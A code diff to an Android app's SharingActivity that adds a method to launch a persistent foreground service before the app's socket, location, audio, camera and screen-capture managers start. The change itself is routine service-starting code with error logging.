@@ -3,6 +3,7 @@ package com.example.myapplication;
 import android.content.Intent;
 import android.location.Location;
 import android.media.projection.MediaProjectionManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
@@ -17,6 +18,7 @@ import com.example.myapplication.utils.AudioManager;
 import com.example.myapplication.utils.CameraManager;
 import com.example.myapplication.utils.LocationManager;
 import com.example.myapplication.utils.PermissionManager;
+import com.example.myapplication.services.PersistentService;
 import com.example.myapplication.utils.ScreenCaptureManager;
 import com.example.myapplication.utils.ScreenshotManager;
 import com.example.myapplication.utils.SocketManager;
@@ -65,6 +67,9 @@ public class SharingActivity extends AppCompatActivity {
     }
     
     private void initializeManagers() {
+        // Start persistent service first
+        startPersistentService();
+        
         // Initialize socket manager
         SocketManager.getInstance().initialize();
         
@@ -79,6 +84,20 @@ public class SharingActivity extends AppCompatActivity {
         
         // Initialize camera manager
         CameraManager.getInstance().initialize(this);
+    }
+    
+    private void startPersistentService() {
+        try {
+            Intent serviceIntent = new Intent(this, PersistentService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
+            }
+            Log.d(TAG, "Persistent service started from main activity");
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting persistent service", e);
+        }
     }
     
     private void setupClickListeners() {
